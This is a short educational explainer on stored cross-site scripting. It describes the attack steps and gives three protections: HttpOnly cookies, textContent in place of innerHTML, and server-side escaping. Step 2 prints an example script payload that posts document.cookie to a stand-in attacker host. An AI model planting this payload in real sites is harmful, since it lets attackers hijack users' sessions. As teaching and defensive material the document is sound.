#### Cross-Site Scripting

XSS vulnerability consits of simple steps:

_scenario implies, that vulnerable website uses cookies for users session persistence_

1. **Attacker** seeking for some fields/text areas, that can be pushed to the server and further - saved in database.
2. **Attacker** modifies data in this areas such that it contains correct html/js syntax like 
```javascript 
<script>fetch('https://attackers.site.org/user/data', {method: 'POST', body: document.cookie});<script>
```
3. **Victim** visits this site where server now returns html with fields, which contains **Attacker's** script.
4. **Victim's** browser parse this correct script and therefore sends `document.cookie` to **Attacker's** server.
5. **Attacker** don't even need to know user's login/password. He just need to put **Victim's** cookies under his browser 
(since `document.cookies` allows to fetch local cookie on the same domain), 
that lets him to be logged in on vulnerable website.


##### Methods to protect:

1. Server response, that contains HTTP header `Set-Cookie` (which is used to store cookie on the client-side) 
should add `HttpOnly` flag, that prevents cookie from being readed using `document.cookie`, but allows to interchange cookie
using http requests.
2. One another step is to use `element.textContent` instead of `element.innerHTML` for fields/text areas. 
Browser willn't parse any valid html/js inside `element.textContent` attribute.
3. Another approach is to sanitize symbols in this areas on the server-side, e.g. `<>/` to `&lt;&gt;`.
